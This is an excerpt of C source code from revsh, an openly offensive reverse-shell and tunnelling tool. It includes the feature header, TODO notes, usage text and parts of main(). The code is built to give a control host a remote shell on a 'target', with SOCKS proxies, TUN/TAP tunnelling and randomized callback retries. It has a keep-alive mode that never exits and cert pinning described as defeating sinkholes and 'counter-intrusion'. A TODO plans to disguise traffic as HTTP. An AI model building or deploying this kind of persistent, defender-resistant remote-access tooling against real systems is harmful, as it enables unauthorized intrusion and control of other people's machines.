 ...
 * 2015-01-16: YACO (Yet another complete overhaul.) Added the internal
 *messaging interface.
 * 2016-08-27: YACO (Yet another complete overhaul.) Added proxies, tun/tap
 *support, and cleaned up the broker() loop.
 *
 *
 * The revsh binary is intended to be used both on the local control host as
 *well as the remote target host. It is
 * designed to establish a remote shell with terminal support as well as a
 *reverse vpn for tunneling.
 *
 *
 * Features:
 *    * Reverse Shell.
 ...
 *    * Ephemeral Diffie-Hellman encryption for use with key managment. (Now
 *with more Perfect Forward Secrecy!)
 *    * Cert pinning for protection against sinkholes and mitm
 *counter-intrusion.
 ...
 *      (Note: Only the "TCP Connect" subset of the socks protocol is
 *supported.)
 *    * TUN / TAP support for forwarding raw IP packets / Ethernet frames.
 *    * Escape sequence commands to kill non-responsive nodes, or print
...
/* XXX
        ...
        - Redo tty main tty io. Implement as a separate process. Use this for
   escape sequences.
                This will fix the case where the inner select() (inside
   io->remote_read() and
                io->remote_write()) doesn't catch escape sequences
   appropriately.
                This also dovetails nicely into abstracting the operator's main
   tty out of the
                flow, so it can be replaced with a more full featured
   implementation.

                -- This, and many other features will be better if I re-write
   the whole thing
                        in go with better modularity, multi-threading, better
   UI, division of labor,
                        c10k viable, etc.  :(

        - Add tun/tap support for FreeBSD.

        - Add "Certificate Knocking":
                -- Manually perform challange response validation of target
   cert.
                        --- Kill "client" (target) cert verification during SSL
   handshake.
                        --- Change protocol to start with an HTTP request.
   Random string dir will be sha1sum of target cert.
                                ----  e.g. "GET
   /a646ceed9e8b7245b616accf5e715fa15093122d HTTP 1.1\n\n"
                        --- Control sends HTTP response with challenge number
   encrypted with target private key.
                        --- Target responds with an HTTP request that is the
   random string dir and the unencrypted challenge number as a subdir.
                                ----  e.g. "GET
   /a646ceed9e8b7245b616accf5e715fa15093122d/6222703937 HTTP 1.1\n\n"
                        --- At this point both ends drop down to the previous
   revsh protocol.
                -- Alternatively, do something similar (mutual challange
   response) involving cookies.
...
void usage(int ret_code) {
  ...
  fprintf(
      out_stream,
      "Target:\t\t%s     [TARGET_OPTIONS] [MUTUAL_OPTIONS] [ADDRESS[:PORT]]\n",
      program_invocation_short_name);
  fprintf(out_stream,
          "\n\tADDRESS\t\tThe address of the control listener.\t\t(Default is "
          "\"%s\".)\n",
          CONTROL_ADDRESS);
  fprintf(
      out_stream,
      "\tPORT\t\tThe port of the control listener.\t\t(Default is \"%s\".)\n",
      CONTROL_PORT);

  fprintf(out_stream, "\nCONTROL_OPTIONS:\n");
  fprintf(out_stream,
          "\t-c\t\tRun in \"command and control\" mode.\t\t(Default is target "
          "mode.)\n");
#ifndef GENERIC_BUILD
  fprintf(out_stream,
          "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is "
          "Ephemeral Diffie-Hellman.)\n");
#ifdef OPENSSL
  fprintf(out_stream,
          "\t-d KEYS_DIR\tReference the keys in an alternate "
          "directory.\t(Default is \"%s\".)\n",
          KEYS_DIR);
#endif /* OPENSSL */
#endif
  fprintf(out_stream,
          "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is "
          "\"%s\".)\n",
          RC_FILE);
  fprintf(
      out_stream,
      "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n",
      DEFAULT_SHELL);
#ifdef LOG_FILE
  fprintf(out_stream,
          "\t-F LOG_FILE\tLog general use and errors to LOG_FILE.\t\t(Default "
          "is \"%s\".)\n",
          LOG_FILE);
#else
  fprintf(out_stream,
          "\t-F LOG_FILE\tLog general use and errors to LOG_FILE.\t\t(No "
          "default set.)\n");
#endif

  fprintf(out_stream, "\nTARGET_OPTIONS:\n");
  fprintf(out_stream,
          "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is "
          "\"%d\".)\n",
          TIMEOUT);
  fprintf(out_stream,
          "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default "
          "is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n",
          RETRY);

  fprintf(out_stream, "\nMUTUAL_OPTIONS:\n");
  fprintf(out_stream,
          "\t-k\t\tRun in keep-alive mode.\n\t\t\tNode will neither exit "
          "normally, nor timeout.\n");
  ...
  fprintf(out_stream,
          ...
          "LHOST:LPORT.\t\t\t(Socks 4, 4a, and 5. TCP connect only.)\n");
  fprintf(out_stream,
          "\t-x\t\tDisable automatic setup of proxies.\t\t(Defaults: Proxy D%s "
          "and tun/tap devices.)\n",
          SOCKS_LISTENER);
  fprintf(out_stream,
          "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell "
          "mode.)\n");
  fprintf(out_stream, "\t\t\tThe -b flag must be invoked on both ends.\n");
  fprintf(out_stream,
          "\t-n\t\tNon-interactive netcat style data broker.\t(Default is "
          "interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying "
          "files.\n");
...
#ifdef GENERIC_BUILD
  fprintf(out_stream,
          "\n\tThis is the GENERIC_BUILD of revsh, which defaults to Anonymous "
          "Diffie-Hellman encryption.\n");
  fprintf(out_stream,
          "\tIn order to enable Ephemeral Diffie-Hellman (with Perfect Forward "
          "Secrecy) you will need to\n");
  fprintf(out_stream,
          "\tbuild your own copy from source and manage your own keys.\n");
  fprintf(
      out_stream,
      "\tThe source is available at: https://github.com/emptymonkey/revsh\n");
#endif
 ...
 *
 * Purpose: main() parses the configuration and calls the appropriate conductor
 *function.
 *
 **********************************************************************************************************************/
int main(int argc, char **argv) {
  ...
  // First thing, check that our effective user id is also our real. We may be
  // in a suid
  // situation where they differ. If so, propagate the euid now before we call
  // the shell
  ...
  if ((io = (struct io_helper *)calloc(1, sizeof(struct io_helper))) == NULL) {
    report_error("main(): calloc(1, %d): %s", (int)sizeof(struct io_helper),
                 strerror(errno));
    return (-1);
  }

  if ((config = (struct config_helper *)calloc(
           1, sizeof(struct config_helper))) == NULL) {
    report_error("main(): calloc(1, %d): %s", (int)sizeof(struct config_helper),
                 strerror(errno));
    return (-1);
  }
  ...
  /*  Normally I would use the Gnu version. However, this tool needs to be more
   * portable. */
 ...
 */
      ...
      // This flag is called "target" because it will be the target id once we
      // implement
      // multiple target nodes. Control will always be id 0, which from a flag
      // perspective
      ...
      case 'D':
      case 'B':
        if ((tmp_proxy_ptr = (struct proxy_request_node *)calloc(
                 1, sizeof(struct proxy_request_node))) == NULL) {
          report_error("main(): calloc(1, %d): %s",
                       (int)sizeof(struct proxy_node), strerror(errno));
          return (-1);
        }
  ...
  if ((tmp_ptr = strchr(config->ip_addr, ':')) == NULL) {
    ...
    // free() not called. One time allocation core to the process state. No way
    // to change after initialization.
    if ((tmp_ptr = (char *)calloc(tmp_size + 1, sizeof(char))) == NULL) {
      report_error("main(): calloc(%d, %d): %s", tmp_size + PORT_STRING_LEN + 1,
  ...
  if (!io->target && config->log_file) {
    ...
    if (wordexp(config->log_file, &log_file_exp, 0)) {
      report_error("main(): wordexp(%s, %lx, 0): %s", config->log_file,
                   (unsigned long)&log_file_exp, strerror(errno));
      return (-1);
    }
    ...
    if (config->log_file) {
      if ((io->log_stream = fopen(log_file_exp.we_wordv[0], "a")) == NULL) {
        report_error("main(): fopen(\"%s\", \"a\"): %s",
                     log_file_exp.we_wordv[0], strerror(errno));
        return (-1);
      }
    }
  ...
  if ((tmp_fd = open("/dev/urandom", O_RDONLY)) == -1) {
    report_error("main(): open(\"/dev/urandom\", O_RDONLY): %s",
                 strerror(errno));
    return (-1);
  }

  if ((retval = read(tmp_fd, &seed, sizeof(seed))) != sizeof(seed)) {
    report_error("main(): read(%d, %lx, %d): Unable to fill seed!", tmp_fd,
                 (unsigned long)&seed, (int)sizeof(seed));
    return (-1);
  }
  ...
  /*  The joy of a struct with pointers to functions. We only call
   * "io->remote_read()" and the */
  ...
  if (errno) {
    report_error("main(): strtol(%s, %lx, 10): %s", retry_string,
  ...
  // We will occasionally fork() children in certain conditions. We will never
      ...
      if (retval != -1 && config->bindshell && config->keepalive) {
        if (config->retry_stop) {
          ...
          retry = config->retry_start +
                  (tmp_ulong % (config->retry_stop - config->retry_start));
        } else {
          retry = config->retry_start;
        }
    ...
    do {
      ...
      if (retval != -1 && !config->bindshell && config->keepalive) {
        ...
        if (sigaction(SIGALRM, &act, NULL) == -1) {
          report_error("main(): sigaction(%d, %lx, %p): %s", SIGALRM,
 ...
 * Output: None.
 *
 * Purpose: In keepalive mode, we can't rely on the exit to handle cleanup.
 *Since we may loop forever, let's clean up
...
/*
         The man page for POSIX_OPENPT(3) states that for code that runs on
   older systems, you can define this yourself
         easily.
 */
#ifndef FREEBSD
